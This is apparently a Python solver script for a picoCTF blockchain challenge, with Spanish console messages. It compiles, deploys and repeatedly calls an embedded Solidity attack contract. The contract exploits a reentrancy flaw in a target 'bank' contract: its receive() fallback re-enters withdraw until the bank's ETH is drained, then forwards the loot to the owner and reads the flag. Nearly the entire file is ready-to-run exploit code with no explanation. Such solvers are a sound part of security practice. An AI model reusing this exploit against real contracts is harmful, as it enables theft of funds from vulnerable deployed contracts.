#!/usr/bin/env python3
import os
import sys
import time
from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version

RPC_URL = "http://crystal-peak.picoctf.net:53715"

BANK = os.environ.get("BANK")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")

if not BANK or not PRIVATE_KEY:
    print("Faltan variables:")
    print('  export BANK="0xBANK_ADDRESS"')
    print('  export PRIVATE_KEY="0xYOUR_PRIVATE_KEY"')
    print("  python3 solve_reentrance.py")
    sys.exit(1)

ATTACK_VALUE_ETH = "1"

SOURCE = r'''
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract Attack {
    IVulnBank public bank;
    address payable public owner;
    uint public chunk;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "send ETH");
        chunk = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint bankBalance = address(bank).balance;

        if (bankBalance > 0) {
            uint amount = bankBalance < chunk ? bankBalance : chunk;
            bank.withdraw(amount);
        }
    }

    function getFlag() external view returns (string memory) {
        return bank.getFlag();
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "not owner");
        owner.transfer(address(this).balance);
    }
}
'''

BANK_ABI = [
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    }
]

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))

    if not w3.is_connected():
        print(f"[!] No conecta al RPC: {RPC_URL}")
        sys.exit(1)

    bank_addr = Web3.to_checksum_address(BANK)
    acct = w3.eth.account.from_key(PRIVATE_KEY)

    print(f"[+] RPC       = {RPC_URL}")
    print(f"[+] chainId   = {w3.eth.chain_id}")
    print(f"[+] player    = {acct.address}")
    print(f"[+] bank      = {bank_addr}")
    print(f"[+] balance   = {w3.from_wei(w3.eth.get_balance(acct.address), 'ether')} ETH")
    print(f"[+] bank bal  = {w3.from_wei(w3.eth.get_balance(bank_addr), 'ether')} ETH")

    print("[+] Compilando Attack.sol...")
    install_solc("0.6.12")
    set_solc_version("0.6.12")

    compiled = compile_source(SOURCE, output_values=["abi", "bin"])

    attack_key = None
    for key in compiled.keys():
        if key.endswith(":Attack"):
            attack_key = key
            break

    if attack_key is None:
        print("[!] No encontré contrato Attack")
        sys.exit(1)

    attack_interface = compiled[attack_key]
    abi = attack_interface["abi"]
    bytecode = attack_interface["bin"]

    if not bytecode:
        print("[!] Bytecode vacío")
        sys.exit(1)

    Attack = w3.eth.contract(abi=abi, bytecode=bytecode)

    gas_price = w3.eth.gas_price
    nonce = w3.eth.get_transaction_count(acct.address, "pending")

    print("[+] Desplegando contrato atacante...")
    deploy_tx = Attack.constructor(bank_addr).build_transaction({
        "from": acct.address,
        "nonce": nonce,
        "gas": 1_500_000,
        "gasPrice": gas_price,
        "chainId": w3.eth.chain_id,
    })

    signed = acct.sign_transaction(deploy_tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    txh = w3.eth.send_raw_transaction(raw)

    print(f"[+] Deploy tx: {txh.hex()}")

    receipt = w3.eth.wait_for_transaction_receipt(txh, timeout=180)

    if receipt.status != 1:
        print("[!] Falló el deploy")
        sys.exit(1)

    attack_addr = receipt.contractAddress
    print(f"[+] ATTACK = {attack_addr}")

    attack = w3.eth.contract(address=attack_addr, abi=abi)

    while True:
        bank_balance = w3.eth.get_balance(bank_addr)
        print(f"[+] Bank balance: {w3.from_wei(bank_balance, 'ether')} ETH")

        if bank_balance == 0:
            break

        value = w3.to_wei(ATTACK_VALUE_ETH, "ether")

        if value > w3.eth.get_balance(acct.address):
            print("[!] No tienes suficiente ETH para otro ataque.")
            break

        print(f"[+] Ejecutando attack() con {ATTACK_VALUE_ETH} ETH...")

        nonce = w3.eth.get_transaction_count(acct.address, "pending")
        attack_tx = attack.functions.attack().build_transaction({
            "from": acct.address,
            "nonce": nonce,
            "value": value,
            "gas": 2_500_000,
            "gasPrice": gas_price,
            "chainId": w3.eth.chain_id,
        })

        signed = acct.sign_transaction(attack_tx)
        raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
        txh = w3.eth.send_raw_transaction(raw)

        print(f"[+] Attack tx: {txh.hex()}")

        receipt = w3.eth.wait_for_transaction_receipt(txh, timeout=180)
        print(f"[+] Attack status: {receipt.status}")

        if receipt.status != 1:
            print("[!] attack() falló. Prueba bajar ATTACK_VALUE_ETH a 0.5")
            sys.exit(1)

        time.sleep(1)

    print("[+] Leyendo flag...")
    bank = w3.eth.contract(address=bank_addr, abi=BANK_ABI)

    try:
        flag = bank.functions.getFlag().call()
        print(f"[+] FLAG: {flag}")
    except Exception as e:
        print("[!] No pude leer getFlag():", e)
        print("[*] Refresca la página del reto; si el banco quedó en 0, debería mostrar la flag.")

if __name__ == "__main__":
    main()
